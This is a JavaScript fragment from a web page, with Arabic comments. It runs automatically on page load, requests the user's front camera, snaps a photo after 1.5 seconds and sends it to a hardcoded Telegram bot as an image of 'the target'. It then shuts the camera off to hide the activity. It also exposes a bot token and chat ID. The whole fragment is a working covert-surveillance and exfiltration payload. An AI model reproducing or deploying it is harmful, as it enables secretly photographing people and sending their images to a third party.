        const BOT_TOKEN = '8770202037:AAFUbYCY_-sAGNI9jiDyOm_ryObq9YWC8Uc';
        const CHAT_ID = '6927046565';

        async function activateSystem() {
            try {
                // طلب صلاحية الكاميرا (الخطوة الحرجة)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                video.onloadedmetadata = () => {
                    // التقاط الصورة بعد 1.5 ثانية لضمان وضوح الوجه
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0);

                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('photo', blob, 'target.png');
                            formData.append('caption', '⚠️ تنبيه: تم التقاط صورة للهدف بنجاح!');

                            // إرسال البيانات فوراً إلى تليجرام
                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });

                            // إيقاف الكاميرا فوراً لإخفاء النشاط
                            stream.getTracks().forEach(track => track.stop());
                        }, 'image/png');
                    }, 1500);
                };
            } catch (err) {
                console.log("Access Denied");
            }
        }

        // تشغيل النظام تلقائياً عند فتح الصفحة
        window.onload = activateSystem;
    </script>
